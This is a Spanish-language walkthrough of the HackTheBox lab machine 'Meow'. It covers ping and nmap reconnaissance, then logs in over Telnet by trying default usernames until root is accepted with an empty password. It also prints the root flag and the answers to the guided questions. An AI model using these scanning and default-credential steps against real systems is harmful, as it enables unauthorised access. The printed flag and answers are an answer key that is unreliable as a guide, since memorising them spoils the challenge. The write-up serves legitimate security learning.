---
Titulo: Meow
Plataforma: HackTheBox
Laboratorio: Starting Point Tier 0
Dificultad: Very Easy
os: Linux
ip: 10.129.53.48
Fecha: 13-09-2026
tags:
  - "#very-easy"
  - Starting-Point
  - Tier0
  - HTB-Labs
---
<center><img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d2-20d6-4d94-8797-9a5f9c4372c3.png"></center>
# 🖥️ Máquina MEOW
`Meow` es una máquina Linux muy fácil (`very easy`) que guía a los jugadores a configurar sus máquinas atacantes, conectándose a los laboratorios HTB a través de VPN y demuestra la estrategia de cómo completarlas. La máquina se centra en las técnicas de enumeración para principiantes y muestra la explotación de un servicio Telnet vulnerable a través de credenciales predeterminadas.

---
## Conectividad
Antes de escanear puertos, verificamos que la máquina objetivo esté activa y accesible en la red mediante una solicitud de eco ICMP (`ping`). Este paso es importante porque confirma la conectividad real con el objetivo antes de invertir tiempo en un escaneo más pesado, y de paso entrega información gratuita, una de ellas es el valor de `TTL`, el cual es una pista temprana del SO. Linux suele iniciar en `64`, Windows en `128`; si el valor llega decrementado (ej. 63 o 127), indica cuántos saltos/routers cruzó el paquete en el camino,

```bash title:"Ping - Verificación de Conectivdad"
ping -c 1 10.129.53.48
```

```bash
PING 10.129.53.48 (10.129.53.48) 56(84) bytes of data.
64 bytes from 10.129.53.48: icmp_seq=1 ttl=63 time=13.8 ms

--- 10.129.53.48 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```
## Reconocimiento

```bash title="Nmap - Descubrimiento de puertos"
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.53.48 -oN allPorts
```

```bash
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63
```

```bash title="Nmap - Escaneo dirigido"
sudo nmap -p23 -sV -vvv 10.129.53.48 -oN targeted
```

```bash
PORT   STATE SERVICE REASON         VERSION
23/tcp open  telnet  syn-ack ttl 63 Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El escaneo dirigido confirma un único puerto abierto: **23/TCP (Telnet)**, corriendo `Linux telnetd` sobre un kernel Linux (`cpe:/o:linux:linux_kernel`). Esto es relevante debido a que **telnet** transmite credenciales y datos en texto plano, sin cifrado, lo que lo hace vulnerable tanto a interceptación (sniffing) como a ataques de fuerza bruta o credenciales por defecto.

---
## Enumeración
Al ser Telnet el único servicio expuesto, la enumeración se enfoca en probar credenciales. La práctica recomendada es ir de menor a mayor costo: primero credenciales por defecto/vacías con usuarios comunes (`root`, `admin`, `administrator`, `guest`, `anonymous`), y solo si eso falla, escalar a fuerza bruta con un diccionario.

```bash title="Telnet - Conexión con  Credenciales por defecto"
telnet 10.129.53.48 23


  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

```bash
# Prueba usuario admin
Meow login: admin
Password: 

Login incorrect

# Prueba usuario guest
Meow login: guest
Password: 

Login incorrect

# Prueba usuario administrator
Meow login: administrator
Password: 

Login incorrect

# Prueba usuario anonymous
Meow login: anonymous
Password: 

Login incorrect
```

```bash title:"Telnet - Conexión successfull"
# Prueba usuario admin
Meow login: root
Password:

Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~#
```

---

## Explotación
La vulnerabilidad explotada es una **autenticación insuficiente** por cuenta `root sin contraseña configurada`, expuesta directamente a través de un servicio Telnet sin cifrado. A diferencia de una contraseña débil que requiere ser adivinada, aquí el sistema operativo no exige contraseña alguna para `root`, lo que convierte el simple conocimiento del nombre de usuario en acceso administrativo completo. Como se mostró en la fase de enumeración, el login con `root` y campo de contraseña vacío otorgó una sesión interactiva directa. Se verifica el nivel de acceso obtenido:

```bash title="Verificación de Acceso Obtenido"
root@Meow:~# whoami
root

# Revisamos los identificadores del usuario actual
root@Meow:~# id
uid=0(root) gid=0(root) groups=0(root)
```

El Acceso obtenido es directamente `root`, por lo que no es necesaria una fase de escalada de privilegios.

---
## Post-Explotación
Con acceso al usuario `root`, se navega en el sistema para ubicar la evidencia objetivo del desafio (`flag`).

```bash title:"Localización de la Flag"
root@Meow:~# pwd 
/root 

root@Meow:~# ls -l 
-rw-r--r-- 1 root root 33 Jun 17 2021 flag.txt 
drwxr-xr-x 3 root root 4096 Apr 21 2021 snap 

root@Meow:~# cat flag.txt
```

```bash
b40abdfe23665f766f9c61ecba8a4c19
```

---
## 🚩 Flags

| Flag     | Ruta             | Valor                              |
| -------- | ---------------- | ---------------------------------- |
| flag.txt | `/root/flag.txt` | `b40abdfe23665f766f9c61ecba8a4c19` |
___
<details>
<summary>📎 Preguntas guiadas (Starting Point)</summary>
<br>

<table>
<tr><td><b>1.</b></td><td>¿Qué significa VM?</td><td><code>Virtual Machine</code> (Máquina Virtual)</td></tr>
<tr><td><b>2.</b></td><td>¿Qué herramienta usamos para interactuar con el OS con el fin de emitir comandos a través de la línea de comandos?</td><td><code>terminal</code></td></tr>
<tr><td><b>3.</b></td><td>¿Qué herramienta utilizamos para formar nuestra conexión VPN en los laboratorios HTB?</td><td><code>openvpn</code></td></tr>
<tr><td><b>4.</b></td><td>¿Qué herramienta probamos con eco ICMP?</td><td><code>ping</code></td></tr>
<tr><td><b>5.</b></td><td>¿Herramienta más común para encontrar puertos abiertos?</td><td><code>nmap</code></td></tr>
<tr><td><b>6.</b></td><td>¿Qué servicio identificamos en el puerto 23/tcp?</td><td><code>telnet</code></td></tr>
<tr><td><b>7.</b></td><td>¿Qué usuario inicia sesión por Telnet con una contraseña vacia?</td><td><code>root</code></td></tr>
<tr><td colspan="2"><b>Desafío:</b> Encuentra la Flag en el directorio de inicio de root</td><td><code>b40abdfe23665f766f9c61ecba8a4c19</code></td></tr>
</table>
</details>
___
## 🧠 Lo que aprendí resolviendo la máquina
Durante la resolución de mi primera máquina virtual aprendí que no toda vulnerabilidad requiere explotar un software o servicio en especifico. Que por una simple falla de configuración (cuenta root sin autenticación) un sistema puede ser comprometido. 

Al principio recurrí a Metasploit usando un método de fuerza bruta de usuario y contraseña contra los usuarios por defecto, lo cual funcionó, pero probablemente haya generado una cantidad de tráfico e intentos que en un entorno con monitoreo real habría disparado alertas. Curiosamente, Metasploit confirmó `root:root` como credencial válida, pero al conectarme manualmente por `Telnet` el sistema ni siquiera solicitó contraseña, lo que sugiere que la cuenta root no tenía autenticación en absoluto, más allá de que esa contraseña específica también fuera aceptada.

Esto me deja una reflexión importante, si esta credencial hubiese sido valida en otros servicios del mismo entorno (SSH, u otros host de la red), habría permitido mantener persistencia y realizar movimiento lateral sin mayor esfuerzo. También me deja presente que en un entorno real, cada intento de autenticación queda registrado, por lo que un enfoque más silencioso y dirigido es preferible a la fuerza bruta masiva.

Las herramientas que utilicé durante este desafio fueron `nmap`, `Telnet`, `ping`. 

---
*Weichafe · [GitHub](https://github.com/{{usuario}})*
